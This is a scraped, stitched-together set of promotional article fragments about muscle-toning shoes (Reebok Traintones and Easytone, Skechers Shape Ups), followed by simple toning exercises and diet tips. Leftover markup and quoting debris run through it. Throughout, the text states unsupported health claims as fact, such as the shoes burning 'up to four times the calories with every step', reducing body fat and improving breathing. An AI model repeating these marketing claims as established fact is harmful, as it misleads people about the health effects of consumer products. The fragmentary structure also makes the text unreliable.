            "\t\t\t<content:encoded><![CDATA[<p>It doesn&#8217;t seem like very long ago that Reebok were getting everyone out of the gym by turning everyday walking into a muscle toning workout thanks to their Easytone shoes. The highly stylish toner shoes were an instant hit with women looking to get in shape faster and get more rewards from the time they spent exercising. What made them such a bestselling style was their ability to convert dead time into toning time, making a day long workout a possibility without having to go to the gym, or have the expense that accompanies it. Whenever walking the dog, walking to work, or running for the bus, the muscles get better body tone as they work harder with each step.",
            "<p>Now that Reebok has got so many bottoms and legs into great shape and good condition, they return to the gym with their Traintones. The shoes are based on the Easytone design, however have been modified to make them more stable and comfortable for the gym and fitness classes. They still tone the muscles throughout the lower body, although not to such a high degree as with the Easytone. The distinctive instability pods on the outsoles of the shoes are shallower in Reebok Traintones to offer the stability and durability necessary to cope with higher impact workouts, and the toe pod has been replaced with a toe gripper, for extra traction when up on the toes.",
            "<p>The instability pods in the soles create an uneven base, and the shifting air inside the pods ensures that the muscles in the lower body are kept active as they correct the balance. Working out in Reebok Traintones targets the muscles in the calves, hamstrings and buttocks to improve body tone quickly, and will also help to increase strength and stamina, not just in the lower body but also in the core muscles too. The added work the muscles have to do helps to increase endurance, boosting strength and stamina to keep you training for longer.",
            "<p>Whilst an unstable base might sound uncomfortable, Reebok have worked hard on the design to make it one of the most comfortable shoes they have ever produced. Inside the shoes, a seamless lining is ultra smooth on the feet, and removes all potential sources of abrasion. A cushioned insole is highly comfortable, and a removable sockliner can be replaced with a custom orthotic insert for posture correction and added support. The midsole is well cushioned, and DMX shear technology in the heel slows down the heel strike and dissipates the shockwaves for greater comfort.",
            "<p>With great comfort and cushioning, highly attractive styling and the chance to improve body tone without exercising for longer, make these Reebok toning shoes a great addition to your gym kit, and will get you in shape in next to no time.</p>",

Americans have recently started wearing the muscle toning shoes commonly known as Skechers Shape Ups. By using the toning muscle shoe it can surprisingly reduce the aches and pains that many Americans have. Because most Americans walk around all day on hard surfaces like concrete and asphalt in normal shoes, it puts an unnatural posture on their bodies. By wearing these muscle toning shoes, it allows the pressure to distribute to other parts of the foot because it imitates the feel of a soft surface.",
            "<p>Because this shoe has a convexly curved sole it helps Americans who wear this type of shoe improve their posture. It allows the body to keep going forward without any slouching. This shoe also allows the stimulation of those muscles that are neglected throughout our bodies. These types of muscles were formed to compensate for uneven surfaces, but because most Americans walk on even hard ground all day these muscles don&#8217;t get worked very often. By wearing muscle toning shoes it brings back the dormant muscles back to life.",
            "<p>It&#8217;s not only the dormant muscles that are not being worked out properly either. Thighs, abs and buttocks will be stimulated because of the natural instability that is designed in the shoe. By wearing this shoe it will increase the amount of burned calories not only while you are walking but also while you are standing. There are many different types of brands of these muscle toning shoes that one can purchase. You may want to check these brands out.",

They are designed by having a kinetic wedge that helps to absorb the shock while walking. It features a thick dual midsole and a unique bottom that allows rolling while you walk. ShapeUps are worn to help reduce body fat and help tone muscles and help strengthen them. It helps improve your body&#8217;s posture and help relieve tension. Shape Ups are not designed to take place of regular exercise, it&#8217;s designed to help you exercise while going about your daily business.",

They use a Biofoam for cushion and have an anatomic arch support. By wearing these shoes you can burn up to four times the calories with every step you take. It helps you walk more efficiently and helps build lean body mass. It will help out your posture and help out on better breathing.",

            "<p> * Wall pushups &#8211; On a sturdy wall, place your hands in front of you and slowly lean into the wall. Push back off with your arms and chest. Repeat.",
            "<p> * Squats &#8211; Standing with your feet a little more than shoulder&#8217;s width apart, slowly bend your knees to come into a sitting position, but don&#8217;t let your knees extend past your toes as you do so. Your upper body should be as straight as possible (imagine a string attached to the top of your head as you move). Lower until almost at a ninety degree angle and then lift back up.<br /> * Suck it in &#8211; While this seems a little too easy, try holding your stomach in as tightly as you can for as long as you can. You will work out all of the muscles in your abdomen. Do this whenever you can. You can perform the same tightening motion for your buttocks too to increase their tone.",
            "<p> * Calf raises &#8211; In a standing position, try to lift your heels from the floor and hold in that position. Slowly lower yourself down.",

And while they don&#8217;t require any weights or resistance bands, they can be modified to include these forms of resistance as you improve your fitness levels. You will also want to remember that the more toning exercises for women you do, the more benefits you will receive in return. So, if you only have a few minutes to spare, try to fit in as many exercises you can. You may even begin to enjoy standing in line once you see the way your body changes.</p>",

Toning thighs means getting rid of the fat that surrounds the muscles and you can speed up this process by cutting back on fatty and processed foods. A good cardio workout is also an essential companion; it may not be enough to get rid of all the fat, but it is important that you balance the work that you do.</p>",

With a partner or a friend, turn previously painful exercise into a pleasure by enjoying a relaxing, sociable walk. Also, why don&#8217;t you avoid the lifts and take the stairs instead? It&#8217;s another simple way to tone up those problem areas and you&#8217;ll feel much better for it.",
